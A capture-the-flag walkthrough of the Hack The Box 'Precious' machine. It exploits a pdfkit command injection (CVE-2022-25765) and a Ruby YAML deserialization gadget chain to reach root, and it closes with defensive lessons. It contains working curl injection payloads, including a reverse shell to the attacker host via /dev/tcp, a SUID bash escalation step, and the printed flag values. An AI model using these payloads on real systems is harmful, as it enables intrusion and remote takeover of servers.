# Precious — Hack The Box Walkthrough

**Box:** Precious | **Difficulty:** Very Easy | **OS:** Linux | **Status:** 🟢 ROOTED  
**Target:** 10.129.228.98 | **Attacker:** 10.10.14.23 | **Date:** 2026-03-23

---

## Executive Summary

Precious is a beginner-friendly Linux box on Hack The Box that illustrates two high-severity vulnerabilities commonly found in real-world web applications. Initial access is achieved through CVE-2022-25765, a command injection vulnerability in the `pdfkit` Ruby gem (< v0.8.7) — a critical flaw with CVSS 10.0. A web application that converts URLs to PDFs passes user-supplied URL parameters unsanitized into a shell command, allowing arbitrary command execution. The ruby user has access to a sudo-able Ruby script that uses the unsafe `YAML.load()` method, enabling a pre-authenticated Ruby object deserialization attack to escalate to root.

---

## Attack Chain Overview

```
[Port Scan]           → 22/SSH, 80/HTTP (Caddy + pdfkit)
[Initial Access]      → CVE-2022-25765: pdfkit command injection → RCE as 'ruby'
[Credential Access]   → Read henry credentials from /home/ruby/.bundle/config
[User Shell]          → SSH as henry → user.txt
[Privilege Escalation]→ sudo ruby /opt/update_dependencies.rb → YAML.load() → root
```

---

## Initial Access — CVE-2022-25765 (pdfkit Command Injection)

**CVSS:** 10.0 Critical | **Affected:** pdfkit < 0.8.7

### Discovery

A full TCP port scan reveals two open ports:

```
22/tcp  → OpenSSH 8.4p1
80/tcp  → HTTP (Caddy web server)
```

Port 80 hosts a PDF conversion web application. It accepts a `?url=` query parameter, fetches the supplied URL server-side, and renders the result as a PDF using `wkhtmltopdf`. The underlying library is `pdfkit` gem version 0.8.6.

The vulnerability lies in how pdfkit passes the URL to the shell via `wkhtmltopdf`. Ruby's `#{}` string interpolation syntax inside the URL parameter bypasses the gem's sanitization, injecting shell commands:

```bash
# Ping test — confirm OOB command execution
curl "http://10.129.228.98/?url=http://attacker:8080/?x=#{'%20`ping -c 1 10.10.14.23`'}"

# Reverse shell
curl "http://10.129.228.98/?url=http://attacker:8080/?x=#{'%20`bash -i >& /dev/tcp/10.10.14.23/4444 0>&1`'}"
```

This grants a shell as the `ruby` user.

### Credentials Found

Inside the ruby home directory, `/home/ruby/.bundle/config` contains henry's SSH password, enabling a proper interactive session.

---

## User Flag

```bash
ssh henry@10.129.228.98
cat /home/henry/user.txt
# a91c96880dc0d09a4082c2b9a70c6c97
```

---

## Privilege Escalation — Ruby YAML Deserialization

**Current User:** henry | **Target:** root | **Ruby:** 2.7.0

### Discovery

Running `sudo -l` reveals that henry can execute a Ruby script as root without a password:

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Examining the script shows it uses the dangerous `YAML.load()` method (not `safe_load`) to parse `/opt/update_dependencies.yml`. Ruby's `YAML.load` deserializes arbitrary Ruby object graphs, enabling a gadget-chain attack to achieve arbitrary command execution.

### Exploitation — Gem::Installer Gadget Chain

Ruby 2.7.0 patched the common `Gem::DependencyList` deserialization chain. The working chain uses `Gem::Installer` → `Gem::SpecFetcher` → `Gem::Requirement` → `Gem::Package::TarReader` → `Net::BufferedIO` → `Net::WriteAdapter` → `Gem::RequestSet` → `Kernel.system`.

The payload sets a SUID bit on `/bin/bash`, which is then leveraged for a root shell:

```bash
# Deploy the malicious YAML (gem::installer chain embedded in /opt/update_dependencies.yml)
cp /tmp/payload.yml /opt/update_dependencies.yml
sudo /usr/bin/ruby /opt/update_dependencies.rb

# Root shell
/bin/bash -p
# uid=0(root) gid=0(root) ✅
```

---

## Flags

| Flag | Value                              | Location        |
|------|------------------------------------|-----------------|
| User | `a91c96880dc0d09a4082c2b9a70c6c97` | `/home/henry/user.txt` |
| Root | `36b8227ef79c5b2a7987c68b4b551d5c` | `/root/root.txt` |

---

## Lessons Learned

### 1. Never Use `YAML.load()` with Untrusted Input
`YAML.load` deserializes arbitrary Ruby objects, not just basic data types. Ruby's object deserialization is Turing-complete through gadget chains — any application that calls `YAML.load` on attacker-controlled data is effectively executing arbitrary code. Always use `YAML.safe_load` with an explicit whitelist of permitted classes.

### 2. Sanitize All User Input Passed to System Calls
The pdfkit vulnerability is a classic shell injection. Any user-supplied string that reaches a shell (via backticks, `$()`, `system()`, `exec()`, etc.) must be rigorously validated. URL parameters are especially dangerous because they cross a trust boundary (client → server → shell).

### 3. Ruby Gem Version Awareness Matters
The same gadget chain does not work across all Ruby versions. The `Gem::DependencyList` chain was patched in Ruby 2.7+. When exploiting YAML deserialization, always confirm the exact Ruby version and research the appropriate gadget chain.

### 4. sudo Rules Should Be As Minimal As Possible
Even NOPASSWD sudo rules for a single script can be dangerous if the script uses unsafe deserialization or other exploitable primitives. The principle of least privilege applies at the script level too.

---

## References

- [CVE-2022-25765 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-25765)
- [pdfkit Security Advisory — GitHub](https://github.com/pdfkit/pdfkit/security/advisories/GHSA-rv5c-7pp3-cc24)
- [vakzz — Ruby YAML Deserialization Research](https://github.com/vakzz)
- [Staaldraad — Packaged Ruby YAML Gadget Chain](https://staaldraad.github.io/)
- [PayloadsAllTheThings — Ruby Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Ruby)
- [GTFObins — bash SUID](https://gtfobins.github.io/)
